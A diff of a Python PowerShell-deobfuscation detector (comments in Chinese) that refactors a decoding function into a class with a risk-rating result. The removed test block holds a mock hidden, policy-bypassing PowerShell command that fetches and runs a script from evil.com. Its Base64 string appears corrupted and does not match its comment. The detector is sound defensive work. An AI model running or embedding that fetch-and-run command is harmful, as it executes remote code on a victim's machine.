@@ -1,45 +1,48 @@
 import base64
 import re
+from dataclasses import dataclass
+from typing import Optional
 
 
-def sphinx_decode_powershell(raw_cmd: str):
-    """
-    Day 4 核心函數：偵測並解碼 PowerShell Base64 指令
-    """
-    print(f"[*] 正在分析指令: {raw_cmd[:50]}...")
-
-    # 1. 使用正規表達式 (Regex) 尋找編碼參數
-    # 這行『咒語』可以抓到 -enc, -e, -EncodedCommand (不分大小寫)
-    pattern = r"-(?:e|enc|encodedcommand)\s+([A-Za-z0-9+/=]+)"
-    match = re.search(pattern, raw_cmd, re.IGNORECASE)
-
-    if match:
-        b64_str = match.group(1)
-        try:
-            # 2. Base64 解碼成原始位元組
-            decoded_bytes = base64.b64decode(b64_str)
-
-            # 3. 關鍵技術點：使用 UTF-16LE 解碼 (PowerShell 的標準)
-            final_cmd = decoded_bytes.decode("utf-16-le")
-
-            print(f"[!] 警報：偵測到隱蔽指令！")
-            print(f"    還原內容: {final_cmd}")
-
-            # 4. 初步行為判定：如果裡面有 DownloadString 關鍵字
-            if "downloadstring" in final_cmd.lower():
-                print("    判定結果: 🔥 CRITICAL - 發現遠端下載木馬行為！")
-
-        except Exception as e:
-            print(f"[-] 解碼失敗，可能不是標準的加密指令: {e}")
-    else:
-        print("[OK] 指令不含 Base64 混淆特徵。")
+# --- [ 建立數據傳輸標準 ] ---
+@dataclass
+class DeobfuscationResult:
+    is_obfuscated: bool
+    decoded_cmd: Optional[str] = None
+    risk_level: str = "Low"
 
 
-# --- 測試執行區 ---
+# --- [ 將函式升級為『類別』 ] ---
+class SphinxDeobfuscator:
+    def __init__(self):
+        # 將原本的 Regex 咒語變成專家的『專長屬性』
+        self.pattern = re.compile(r"-(?:e|enc|encodedcommand)\s+([A-Za-z0-9+/=]+)", re.IGNORECASE)
+
+    def analyze_command(self, raw_cmd: str) -> DeobfuscationResult:
+        """
+        專業負責：分析單一指令，判斷有無混淆並解碼
+        """
+        match = self.pattern.search(raw_cmd)
+
+        if match:
+            try:
+                b64_str = match.group(1)
+                # 執行 Base64 與 UTF-16LE 解碼
+                decoded = base64.b64decode(b64_str).decode("utf-16-le")
+
+                # 判定風險
+                risk = "🔥 CRITICAL" if "downloadstring" in decoded.lower() else "High"
+
+                return DeobfuscationResult(is_obfuscated=True, decoded_cmd=decoded, risk_level=risk)
+            except:
+                return DeobfuscationResult(is_obfuscated=True, decoded_cmd="[解碼失敗]", risk_level="Error")
+
+        return DeobfuscationResult(is_obfuscated=False)
+
+
+# 為了不破壞你之前的測試，保留執行區塊
 if __name__ == "__main__":
-    # 這是我們捏造的『駭客密信』
-    # 內容解開後是: IEX (New-Object Net.WebClient).DownloadString('http://evil.com/s.ps1')
-    mock_evil = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAASelectionAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA="
-
-    # 執行解碼
-    sphinx_decode_powershell(mock_evil)
+    test_cmd = "powershell.exe -enc dwBoAG8AYQBtAGkA"
+    expert = SphinxDeobfuscator()
+    res = expert.analyze_command(test_cmd)
+    print(f"解碼結果: {res.decoded_cmd}")
